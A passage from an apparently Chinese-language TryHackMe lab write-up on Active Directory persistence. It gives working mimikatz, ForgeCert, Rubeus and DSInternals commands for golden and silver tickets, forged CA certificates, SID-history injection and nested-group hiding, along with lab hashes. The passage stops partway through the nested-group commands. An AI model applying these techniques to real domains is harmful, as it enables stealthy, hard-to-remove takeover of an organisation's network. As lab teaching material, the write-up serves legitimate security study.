<li><strong>持久化</strong>：我们可以利用白银票据修改注册表，来阻止机器账户密码自动重置（通常每 30 天重置一次），从而保持对该主机的持久化访问。</li>
<li><strong>机器账户</strong>：机器账户可以被视为普通的 AD 账户，因此即使只获取了它的权限，也足以继续进行信息收集和攻击。</li>
</ul>
<p>关于 Svc Session Key，这个也要参考这张图。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5d45b999328017c22b0f249069a88767.png" alt="Kerberos authenticate" data-caption="Kerberos authenticate" loading="lazy"></p>
<p>在正常的 Keberos 认证中，Svc Session Key 是 KDC 生成并且返回给我们的，然后 TGS 里面会有一份 Svc Session Key，如果我们没有拿到白银票据（服务账户的 Hash），我们就没法对 TGS 下手，所以这个攻击链就没法完成。正因为有了服务账户的 Hash，所以我们可以捏造 Svc Session Key 了，在原始的过程中，这个 Key 是用来保证请求不被篡改的，一旦有了 Hash，这个安全性就不存在了。</p>
<h3 id="伪造票据实践"><a href="#伪造票据实践" class="headerlink" title="伪造票据实践"></a>伪造票据实践</h3><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 获取域信息，关注 SID 和 FQDN</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADDomain</span></span></code></pre></div></div></figure>

<ul>
<li>DomainSID: S-1-5-21-3885271727-2693558621-2658995185</li>
<li>DNSRoot: za.tryhackme.loc</li>
<li>krbtgt: 16f9af38fca3ada405386b3b57366082</li>
</ul>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 使用 mimikatz 生成金票</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># /ptt 代表让 mimikatz 直接加载凭据到现在这个 session 里</span></span>
<span class="line"><span style="color: #ABB2BF">kerberos::golden </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">admin:ReallyNotALegitAccount </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">id:</span><span style="color: #D19A66">500</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">sid:S</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">21</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">3885271727</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2693558621</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2658995185</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">krbtgt:16f9af38fca3ada405386b3b57366082 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">endin:</span><span style="color: #D19A66">600</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">renewmax:</span><span style="color: #D19A66">10080</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">ptt</span></span></code></pre></div></div></figure>

<p><strong>&#x2F;endin: 票据的绝对有效期（Ticket Lifetime）</strong></p>
<ul>
<li><strong>含义</strong>: 这是票据的<strong>绝对截止日期</strong>。一旦过了这个时间，票据就彻底失效，<strong>无法再续订</strong>。</li>
<li><strong>用途</strong>: 它定义了票据最长能使用多久。在默认的 AD 策略中，这个时间通常是 10 小时。</li>
<li><strong>示例</strong>: 你可以把 <code>/endin</code> 理解为一张电影票的**“有效截止日期”**。过了这个日期，电影票就作废了。</li>
</ul>
<p><strong>&#x2F;renewmax: 票据最长可续订时间（Maximum Renew Lifetime）</strong></p>
<ul>
<li><strong>含义</strong>: 这是票据<strong>可以被续订的最长时间</strong>。只要在 <code>/endin</code> 之前，你可以向 KDC（Key Distribution Center）请求续订，以延长票据的有效时间。但这个续订过程不能超过 <code>/renewmax</code> 的限制。</li>
<li><strong>用途</strong>: 它允许用户在一段时间内保持访问，而无需频繁地重新认证。默认的 AD 策略通常是 7 天。</li>
<li><strong>示例</strong>: 你可以把 <code>/renewmax</code> 理解为一张图书馆借书证的**“最长借书期限”**。你每次借书的期限可能只有两周（<code>/endin</code>），但只要不超过总的“最长借书期限”（<code>/renewmax</code>），你就可以反复续借。</li>
</ul>
<p>虽然黄金票据提供了强大的持久化访问能力，但蓝队可以通过<strong>重置 KRBTGT 账户密码两次</strong>来对抗它。因此，如果想真正实现持久化，更应该使用<strong>白银票据</strong>。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 生成银票</span></span>
<span class="line"><span style="color: #ABB2BF">kerberos::golden </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">admin:StillNotALegitAccount </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">id:</span><span style="color: #D19A66">500</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">sid:S</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">5</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">21</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">3885271727</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2693558621</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">2658995185</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">target:THMSERVER1.za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">service:cifs </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">ptt</span></span></code></pre></div></div></figure>

<ul>
<li><strong>&#x2F;target</strong> - The hostname of our target server. Let’s do THMSERVER1.za.tryhackme.loc, but it can be any domain-joined host.</li>
<li><strong>&#x2F;rc4</strong> - The NTLM hash of the machine account of our target. Look through your DC Sync results for the NTLM hash of THMSERVER1$. The $ indicates that it is a machine account.</li>
<li><strong>&#x2F;service</strong> - The service we are requesting in our TGS. CIFS is a safe bet, since it allows file access.</li>
</ul>
<p>要注意的是，服务账户的密码是会轮换的，一旦轮换了，这个 TGS 就失效了，所以一般还要对注册表下手，以实现持久化。</p>
<h2 id="Persistence-through-Certificates"><a href="#Persistence-through-Certificates" class="headerlink" title="Persistence through Certificates"></a>Persistence through Certificates</h2><p>虽然依赖凭据的持久化技术很有效，但蓝队最终可以通过轮换凭据来清除攻击者的访问权限。因此，我们需要寻找不依赖于凭据的、更高级的持久化技术，而证书就是其中之一。</p>
<p><strong>证书不仅是用于权限提升的工具，更是一种强大且难以清除的持久化手段</strong>。通过获取一张有效的客户端认证证书，攻击者可以绕过密码重置，长期维持对目标账户的访问。这种持久化方式的有效性通常长达数年，除非蓝队主动吊销或等待证书过期。更深一层的攻击是直接攻陷证书颁发机构（CA）本身，窃取其根证书的私钥。这样一来，攻击者就能随意伪造证书，并且这些证书因为没有正式颁发记录，蓝队甚至无法通过吊销来清除，唯一的防御手段是轮换整个 CA，这会对整个组织造成灾难性的业务影响，让蓝队在付出巨大努力清理完其他所有入侵痕迹后，仍然无法摆脱攻击者的控制。</p>
<h3 id="提取私钥"><a href="#提取私钥" class="headerlink" title="提取私钥"></a>提取私钥</h3><p>可以用 Mimikatz 和 SharpDPAPI 提取证书的私钥</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 启动 mimikatz</span></span>
<span class="line"><span style="color: #ABB2BF">C:\Tools\mimikatz_trunk\x64\</span><span style="color: #56B6C2">mimikatz.exe</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 查看存储的证书</span></span>
<span class="line"><span style="color: #ABB2BF">crypto::certificates </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">systemstore:local_machine</span></span></code></pre></div></div></figure>

<p>可以看到有一些证书的 Exportable key : NO，所以没法直接导出，但是我们可以通过修改内存的方式让他们可以导出</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">privilege::debug</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">crypto::capi</span></span>
<span class="line"><span style="color: #ABB2BF">crypto::cng</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 导出证书</span></span>
<span class="line"><span style="color: #ABB2BF">crypto::certificates </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">systemstore:local_machine </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">export</span></span></code></pre></div></div></figure>

<p>导出的证书会同时用 PFX 和 DER 格式存储在目录下，mimikatz 默认会用 <code>mimikatz</code> 密码加密证书。</p>
<h3 id="生成和使用证书"><a href="#生成和使用证书" class="headerlink" title="生成和使用证书"></a>生成和使用证书</h3><p>现在我们有了私钥和根证书，我们能用 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/ForgeCert">ForgeCert</a> 工具去伪造我们想要的用户认证证书。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123</span></span></code></pre></div></div></figure>

<p>要关注的参数是 SubjectAltName，即 SAN。还记得上个 Room 那个证书模板允许使用替代名字吗，就是这个玩意。</p>
<p>然后我们就可以用这个证书去请求 TGT：</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># Rubeus 生成 TGT</span></span>
<span class="line"><span style="color: #ABB2BF">C:\Tools\</span><span style="color: #56B6C2">Rubeus.exe</span><span style="color: #ABB2BF"> asktgt </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:Administrator </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">enctype:aes256 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">certificate:fullAdmin.pfx </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">password:Password123 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">outfile:tgt.tgt </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">domain:za.tryhackme.loc </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">dc:thmdc.za.tryhackme.loc</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># mimikatz 载入 TGT</span></span>
<span class="line"><span style="color: #ABB2BF">kerberos::ptt tgt.tgt</span></span></code></pre></div></div></figure>

<p>这里依旧提示 <code>[X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP</code> ，可以用 LDAP 认证去绕过，上个房间有步骤，就不再叙述了。</p>
<h3 id="我们不再是蓝队的朋友"><a href="#我们不再是蓝队的朋友" class="headerlink" title="我们不再是蓝队的朋友"></a>我们不再是蓝队的朋友</h3><p>证书持久化是极难防御的。即使你轮换了被入侵账户的凭据，证书仍然是有效的。移除这种持久化的唯一方法是吊销证书。然而，这只在我们通过合法渠道生成证书的情况下才有可能。由于我们是导出 CA 后自己生成了证书，它不会出现在 AD CS 的已颁发证书列表中，这意味着蓝队将无法吊销我们的证书。</p>
<p>那么，移除这种持久化的唯一解决方案是什么？这就是我们不再是朋友的原因了。他们将不得不吊销根 CA 证书。但吊销这个证书意味着所有由 AD CS 颁发的证书将全部失效。换言之，他们必须为每个使用 AD CS 的系统重新生成证书。你应该开始明白为什么这种类型的持久化是极其危险的，如果真的发生，可能需要对系统进行全面重建。</p>
<h3 id="拓展阅读-1"><a href="#拓展阅读-1" class="headerlink" title="拓展阅读"></a>拓展阅读</h3><ul>
<li><a target="_blank" rel="noopener" href="https://pentestlab.blog/2021/11/15/golden-certificate/">Golden Certificate</a></li>
</ul>
<h2 id="Persistence-through-SID-History"><a href="#Persistence-through-SID-History" class="headerlink" title="Persistence through SID History"></a>Persistence through SID History</h2><p>这个 SID 就和之前那个改两次 krbtgt 密码有异曲同工之妙，<strong>SID</strong>（Security Identifier）是用来唯一标识用户和组账户的。当一个组织进行 <strong>Active Directory 迁移</strong>时，用户在新域中会得到一个新的 SID。为了让他们能够继续访问旧域的资源，管理员可以将旧的 SID 添加到他们在新账户的 <strong>SID 历史</strong>属性中。</p>
<p>这个过程本质上是赋予一个新账户<strong>旧账户的所有权限</strong>。而攻击者可以滥用这个功能，将一个<strong>高权限账户的 SID</strong>（例如域管理员的 SID）添加到自己<strong>低权限账户的 SID 历史</strong>中。这样，攻击者就能以自己的账户身份，获得高权限账户的所有访问权限，从而实现<strong>持久化</strong>。这种技术非常隐蔽，因为账户本身的权限看起来没有变化，但它实际上拥有了管理员的权限。</p>
<h3 id="SID-History-能让我们为所欲为"><a href="#SID-History-能让我们为所欲为" class="headerlink" title="SID History 能让我们为所欲为"></a>SID History 能让我们为所欲为</h3><p>实际上，SID 历史的功能并不仅限于包含来自其他域的 SID。只要有足够的权限，我们甚至可以将当前域的 SID 添加到我们控制的账户的 SID 历史中。关于这种持久化技术，有以下几个要点：</p>
<ul>
<li>通常，我们需要域管理员或同等的权限才能执行此攻击。</li>
<li>当账户创建登录事件时，与之关联的 SID 会被添加到用户的令牌中，进而决定该账户的权限。这其中包括了组的 SID。</li>
<li>如果我们将<strong>企业管理员（Enterprise Admin）的 SID</strong> 注入到 SID 历史中，就可以将账户权限提升到等同于整个林中所有域的域管理员。</li>
<li>由于 SID 是直接添加到用户令牌中的，即使该账户并未实际加入到任何特定组中，其权限也会被认可。这使得它成为一种非常隐蔽的持久化方法。我们的账户可以只是一名普通用户，只属于 <code>Domain Users</code> 组，却拥有足以攻陷整个域（甚至整个林）的权限。我们甚至可以更进一步，利用这个账户去修改其他账户的 SID 历史，从而让初始的持久化入口更难被发现和修复。</li>
</ul>
<h3 id="伪造历史"><a href="#伪造历史" class="headerlink" title="伪造历史"></a>伪造历史</h3><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 检查我们的用户目前 SID history 没有任何数据</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADUser</span><span style="color: #ABB2BF"> irene.leach </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">properties sidhistory,memberof</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># SIDHistory        : {}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 查看 Domain Admins 组的 SID</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Domain Admins&quot;</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># SID               : S-1-5-21-3885271727-2693558621-2658995185-512</span></span></code></pre></div></div></figure>

<p>我们可以使用类似 Mimikatz 的工具来添加 SID 历史记录。但是，最新版本的 Mimikatz 有一个缺陷，无法通过修补 LSASS 来更新 SID 历史记录。在这种情况下，我们将使用 <a target="_blank" rel="noopener" href="https://github.com/MichaelGrafnetter/DSInternals">DSInternals</a> 工具直接修补 ntds.dit 文件，即存储所有信息的 AD 数据库：</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># NTDS 数据库在运行的时候是被锁定的</span></span>
<span class="line"><span style="color: #56B6C2">Stop-Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name ntds </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">force</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 修补数据库</span></span>
<span class="line"><span style="color: #56B6C2">Add-ADDBSidHistory</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&#39;irene.leach&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SidHistory </span><span style="color: #98C379">&#39;S-1-5-21-3885271727-2693558621-2658995185-512&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DatabasePath C:\Windows\NTDS\ntds.dit</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 启动 NTDS 服务</span></span>
<span class="line"><span style="color: #56B6C2">Start-Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name ntds</span></span></code></pre></div></div></figure>

<p>现在应该就有权限了，用我们那个用户登录检查一下</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 查看当前的 sidhistory</span></span>
<span class="line"><span style="color: #56B6C2">Get-ADUser</span><span style="color: #ABB2BF"> irene.leach </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Properties sidhistory</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># SIDHistory        : {S-1-5-21-3885271727-2693558621-2658995185-512}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 检查一下是否真的有权限执行</span></span>
<span class="line"><span style="color: #ABB2BF">dir \\thmdc.za.tryhackme.loc\c$</span></span></code></pre></div></div></figure>

<h3 id="蓝队的怒火与无力"><a href="#蓝队的怒火与无力" class="headerlink" title="蓝队的怒火与无力"></a>蓝队的怒火与无力</h3><p>如果你使用 RDP 登录到其中一台主机并使用“AD 用户和组”管理工具，你能够看到被添加到你用户账户上的 SID 历史属性。然而，即使拥有最高权限，你也无法通过这个图形界面移除该属性，因为它受到了保护。要移除它，你必须使用像 <strong>AD-RSAT PowerShell</strong> 命令这样的工具。</p>
<p>然而，在你考虑如何移除恶意的 SID 历史属性之前，你首先要能找到它。常规的工具不会告诉你哪里出了问题。那个用户并不会突然显示为“域管理员”组的成员。因此，除非你主动地逐一检查所有用户的属性，否则这会非常难被发现。这是因为 SID 历史只在用户认证时才会被应用和使用。</p>
<p>想象一下你就是蓝队成员，正在处理一起入侵事件。你刚刚完成了一次域清理，为此两次重置了 krbtgt 账户的密码，清除了黄金和白银票据，甚至从头重建了整个 CA 服务器。但就在这时，你却发现攻击者仍然在用一个低权限账户执行域管理员的命令。这绝对会是糟糕透顶的一天。</p>
<h2 id="Persistence-through-Group-Membership"><a href="#Persistence-through-Group-Membership" class="headerlink" title="Persistence through Group Membership"></a>Persistence through Group Membership</h2><p>蓝队会重点监控那些最高权限的“受保护组”，比如 <code>Domain Admins</code>。直接将自己的账户加入这些组，虽然能立刻获得最高权限，但被发现的风险也最大。</p>
<p><strong>选择次要但关键的组</strong>：更隐蔽的策略是选择那些看似普通但实际上拥有强大权限的组，比如：</p>
<ul>
<li><strong>IT 支持组</strong>：可以重置低权限用户的密码。这听起来权限不高，但可以作为“跳板”，通过窃取其他用户的凭据来逐步提升权限。</li>
<li><strong>本地管理员组</strong>：获得对多台机器的本地管理员权限，意味着可以控制这些机器。一旦控制足够多的机器，就有机会横向移动并最终攻陷整个域。</li>
<li><strong>拥有 GPO 所有权的组</strong>：GPO 能够影响整个域的策略，控制它就相当于控制了域内的安全配置。这种权限虽然不是直接的“管理员”，但其潜在危害同样巨大。</li>
</ul>
<p>简而言之，持久化的最高境界不是拥有最高权限，而是<strong>以最低的被发现风险，获得足以重新发起攻击的关键权限</strong>。</p>
<h3 id="嵌套组"><a href="#嵌套组" class="headerlink" title="嵌套组"></a>嵌套组</h3><p>嵌套组（Nested Groups）是一种利用 Active Directory 复杂权限结构的攻击手法。直接将账户加入高权限的父组（如“域管理员”）非常显眼，容易被安全团队发现。因此，攻击者可以转而将自己的账户加入到该父组的<strong>子组中</strong>。通过这种方式，攻击者可以<strong>继承父组的所有权限</strong>，但账户本身看起来只是一个普通子组成员，从而降低了被监控系统发现的风险，实现了隐蔽的持久化访问。这种攻击利用了 AD 中权限可见性差、监控不完善的弱点，是一种比直接加组更隐蔽和高级的持久化技术。</p>
<p>就是套娃，直接加一个组很明显，但是我们可以加这个组下面的组，同样拥有这个组的权限。</p>
<h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 在 People-&gt;IT OU 下创建一个组</span></span>
<span class="line"><span style="color: #56B6C2">New-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;irene.leach Net Group 1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&quot;irene.leach_nestgroup1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DisplayName </span><span style="color: #98C379">&quot;irene.leach Nest Group 1&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupScope Global </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupCategory Security</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 在 People-&gt;Sales OU 下创建一个组</span></span>
<span class="line"><span style="color: #56B6C2">New-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;irene.leach Net Group 2&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&quot;irene.leach_nestgroup2&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DisplayName </span><span style="color: #98C379">&quot;irene.leach Nest Group 2&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupScope Global </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupCategory Security</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 把我们创建的第一个组加到第二个组下面的成员里面</span></span>
<span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;irene.leach_nestgroup2&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach_nestgroup1&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 可以重复很多次</span></span>
<span class="line"><span style="color: #56B6C2">New-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;irene.leach Net Group 3&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&quot;irene.leach_nestgroup3&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DisplayName </span><span style="color: #98C379">&quot;irene.leach Nest Group 3&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupScope Global </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupCategory Security</span></span>
<span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;irene.leach_nestgroup3&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach_nestgroup2&quot;</span></span>
<span class="line"><span style="color: #56B6C2">New-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;irene.leach Net Group 4&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&quot;irene.leach_nestgroup4&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DisplayName </span><span style="color: #98C379">&quot;irene.leach Nest Group 4&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupScope Global </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupCategory Security</span></span>
<span class="line"><span style="color: #56B6C2">Add-ADGroupMember</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity </span><span style="color: #98C379">&quot;irene.leach_nestgroup4&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Members </span><span style="color: #98C379">&quot;irene.leach_nestgroup3&quot;</span></span>
<span class="line"><span style="color: #56B6C2">New-ADGroup</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Path </span><span style="color: #98C379">&quot;OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Name </span><span style="color: #98C379">&quot;irene.leach Net Group 5&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SamAccountName </span><span style="color: #98C379">&quot;irene.leach_nestgroup5&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">DisplayName </span><span style="color: #98C379">&quot;irene.leach Nest Group 5&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupScope Global </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">GroupCategory Security</span></span>
